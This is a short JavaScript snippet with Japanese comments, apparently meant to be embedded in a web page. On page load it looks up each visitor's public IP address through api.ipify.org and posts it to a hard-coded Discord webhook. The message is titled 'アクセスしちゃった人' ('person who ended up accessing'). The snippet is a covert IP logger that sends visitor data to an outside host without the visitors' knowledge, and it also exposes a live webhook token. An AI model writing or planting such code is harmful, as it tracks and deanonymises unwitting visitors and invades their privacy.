
        // IPアドレスを取得する関数
        function getIPAddress() {
            fetch('https://api.ipify.org?format=json')
                .then(response => response.json())
                .then(data => {
                    const ipAddress = data.ip;
                    sendToDiscord(ipAddress); // 取得したIPアドレスをDiscordに送信
                })
                .catch(error => console.error('IPアドレスの取得に失敗しました:', error));
        }

        // DiscordのWebhookにIPアドレスを送信する関数
        function sendToDiscord(ipAddress)  {
            const webhookURL = 'https://discord.com/api/webhooks/1252970766547423324/4mt19ZNcaLR6ZbCxUFRAd-JQeCrnPoZcdNMYGABOFffyGWQ0G9pD882ViOzBm8kVpQL6';
            const payload = {
                embeds: [{
                    title: 'アクセスしちゃった人',
                    description: `IPアドレス: ${ipAddress}`,
                    color: 3447003 // 青色に設定
                }]
            };

            fetch(webhookURL, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(payload)
            })
            .then(response => {
                if (!response.ok) {
                    console.error('Discordへの送信に失敗しました:', response.statusText);
                }
            })
            .catch(error => console.error('Discordへの送信に失敗しました:', error));
        }

        // ページが読み込まれたときにIPアドレスを取得してDiscordに送信する
        getIPAddress();
    